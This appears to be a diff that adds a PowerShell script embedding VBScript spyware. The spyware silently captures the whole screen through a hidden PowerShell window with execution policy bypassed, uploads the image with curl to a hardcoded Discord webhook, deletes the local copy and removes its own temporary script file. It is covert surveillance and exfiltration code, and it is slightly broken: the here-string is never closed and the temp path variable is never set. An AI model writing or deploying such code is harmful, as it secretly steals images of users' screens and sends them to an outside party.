@@ -1,0 +1,65 @@
+$vbs = @'
+Option Explicit
+
+Function CaptureScreenShot()
+
+    Dim shell, fso, path
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    path = shell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads\screenshot_" & _
+           Replace(Replace(Replace(Now, ":", "_"), "/", "_"), " ", "_") & ".jpg")
+
+    ' --- Silent screenshot capture ---
+    Dim ps
+    ps = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+    """Add-Type -AssemblyName System.Drawing; " & _
+    "Add-Type -AssemblyName System.Windows.Forms; " & _
+    "$b=[System.Windows.Forms.SystemInformation]::VirtualScreen; " & _
+    "$img=New-Object System.Drawing.Bitmap $b.Width,$b.Height; " & _
+    "$g=[System.Drawing.Graphics]::FromImage($img); " & _
+    "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); " & _
+    "$img.Save('" & path & "',[System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
+    "$g.Dispose();$img.Dispose();"""
+
+    shell.Run ps, 0, True
+
+    WScript.Sleep 1000
+
+    If Not fso.FileExists(path) Then
+        Exit Function
+    End If
+
+    If SendToDiscord(path) Then
+        On Error Resume Next
+        fso.DeleteFile path, True
+    End If
+
+End Function
+
+
+Function SendToDiscord(filePath)
+
+    Dim shell, exec, output, webhook, cmd
+    Set shell = CreateObject("WScript.Shell")
+
+    webhook = "https://discord.com/api/webhooks/1497759278688108684/TxQm07mx_BX6kQIqhWOW88tcZjqbmh-A4fwXmH5xZsa2XFExVu4blRww2UT6ZWUjTIjR"
+
+    ' Silent curl upload (no window, no output)
+    cmd = "cmd /c curl -s -F ""file=@" & filePath & """ " & webhook & " >nul 2>&1"
+
+    shell.Run cmd, 0, True
+
+    SendToDiscord = True
+
+End Function
+
+
+' --- RUN SILENTLY ---
+CaptureScreenShot()
+
+Set-Content -Path $tempVbs -Value $vbs -Encoding ASCII
+
+Start-Process cscript.exe -ArgumentList "//nologo `"$tempVbs`"" -Wait
+
+Remove-Item $tempVbs -Force
